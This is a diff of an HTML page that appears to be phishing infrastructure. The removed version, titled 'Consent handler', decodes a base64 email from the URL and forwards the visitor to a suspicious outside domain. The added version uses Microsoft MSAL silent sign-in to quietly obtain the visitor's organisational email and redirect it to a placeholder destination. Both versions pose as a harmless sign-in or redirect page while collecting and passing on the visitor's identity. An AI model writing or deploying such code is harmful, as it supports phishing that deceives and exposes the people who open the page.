@@ -1,36 +1,103 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8">
-  <title>Consent handler – redirecting …</title>
-  <script>
-    /* ------------  CONFIG  ------------ */
-    const TARGET_ROOT = 'https://envvar.juthafoo.sa.com/dYybTs!zm2q';   // no trailing slash
-    /* ---------------------------------- */
-
-    (function () {
-      const qs   = new URLSearchParams(window.location.search);
-      const hash = window.location.hash.slice(1); // strip leading #
-      const raw  = qs.get('state') || hash;       // state can be in query or fragment
-
-      if (!raw) {
-        document.body.textContent = 'Missing state parameter – cannot redirect.';
-        return;
-      }
-
-      // Robust base64 decode (add padding if someone stripped it)
-      let email = raw;
-      try {
-        const padded = raw.padEnd(raw.length + (4 - raw.length % 4) % 4, '=');
-        email = atob(padded.replace(/-/g, '+').replace(/_/g, '/'));
-      } catch (_) {
-        // if decoding fails, keep the literal string
-      }
-
-      const dest = `${TARGET_ROOT}/$${encodeURIComponent(email)}`;
-      window.location.replace(dest);
-    })();
-  </script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>MSAL Silent Redirect (Client-ID only)</title>
 </head>
-<body>Redirecting …</body>
+<body>
+  <p id="msg">Checking sign-in…</p>
+
+  <!-- MSAL Browser CDN -->
+  <script src="https://alcdn.msauth.net/browser/2.43.0/js/msal-browser.min.js"></script>
+
+  <script>
+  (async function () {
+    // <<-- Replace with your Client (Application) ID only:
+    const CLIENT_ID = "YOUR_CLIENT_ID_HERE";
+
+    // Use /organizations to allow any Azure AD org accounts.
+    // If you want single-tenant, replace with `https://login.microsoftonline.com/<tenant-id>`
+    const AUTHORITY = "https://login.microsoftonline.com/organizations";
+    const REDIRECT_URI = window.location.origin + "/"; // must match app registration SPA redirect
+    const TARGET_BASE = "http://goal.com"; // destination (per your spec using #fragment)
+
+    const msalConfig = {
+      auth: {
+        clientId: CLIENT_ID,
+        authority: AUTHORITY,
+        redirectUri: REDIRECT_URI
+      },
+      cache: {
+        cacheLocation: "sessionStorage",
+        storeAuthStateInCookie: false
+      }
+    };
+
+    const msalInstance = new msal.PublicClientApplication(msalConfig);
+    const loginRequest = { scopes: ["openid", "profile", "email"] };
+
+    const msg = document.getElementById('msg');
+
+    // helper: get email from MSAL account object
+    function getEmail(account) {
+      if (!account) return null;
+      const claims = account.idTokenClaims || {};
+      return claims.email || claims.upn || claims.preferred_username || null;
+    }
+
+    // handle redirect callback (interactive login)
+    try {
+      const handle = await msalInstance.handleRedirectPromise();
+      if (handle && handle.account) {
+        const email = getEmail(handle.account);
+        if (email) {
+          // redirect immediately with fragment (not sent to server)
+          window.location.replace(`${TARGET_BASE}/#${encodeURIComponent(email.toLowerCase())}`);
+          return;
+        }
+      }
+    } catch (e) {
+      console.warn('Redirect handling error', e);
+      // continue to silent attempts or fallback
+    }
+
+    // try cached account + acquireTokenSilent
+    let accounts = msalInstance.getAllAccounts();
+    if (accounts && accounts.length > 0) {
+      const acct = accounts[0];
+      try {
+        await msalInstance.acquireTokenSilent({ account: acct, scopes: ["openid", "profile", "email"] });
+        const email = getEmail(acct);
+        if (email) {
+          msg.textContent = 'Redirecting...';
+          window.location.replace(`${TARGET_BASE}/#${encodeURIComponent(email.toLowerCase())}`);
+          return;
+        }
+      } catch (err) {
+        console.warn('acquireTokenSilent failed:', err);
+      }
+    }
+
+    // try ssoSilent (may succeed if there is an active SSO session)
+    try {
+      await msalInstance.ssoSilent(loginRequest);
+      accounts = msalInstance.getAllAccounts();
+      if (accounts && accounts.length > 0) {
+        const email = getEmail(accounts[0]);
+        if (email) {
+          window.location.replace(`${TARGET_BASE}/#${encodeURIComponent(email.toLowerCase())}`);
+          return;
+        }
+      }
+    } catch (err) {
+      console.warn('ssoSilent failed:', err);
+    }
+
+    // fallback: interactive redirect login (will prompt consent if needed)
+    msg.textContent = 'Signing in...';
+    msalInstance.loginRedirect(loginRequest);
+  })();
+  </script>
+</body>
 </html>
